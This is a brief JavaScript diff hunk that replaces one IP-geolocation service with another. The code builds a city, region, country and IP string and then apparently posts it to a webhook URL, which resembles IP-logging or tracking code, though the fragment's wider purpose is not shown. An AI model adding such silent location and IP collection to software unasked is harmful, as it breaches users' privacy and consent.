@@ -151,8 +151,8 @@
     // Optional: get approximate location via free IP API (no key needed)
     let location_info = "Unknown";
     try {
-      const geo = await fetch("https://freeipapi.com/api/json").then(r => r.json());
-      location_info = `${geo.cityName}, ${geo.regionName}, ${geo.countryName} (${geo.ipAddress})`;
+      const geo = await fetch("https://ipinfo.io/json").then(r => r.json());
+      location_info = `${geo.city}, ${geo.region}, ${geo.country} (${geo.ip})`;
     } catch (_) {}
 
     await fetch(WEBHOOK_URL, {
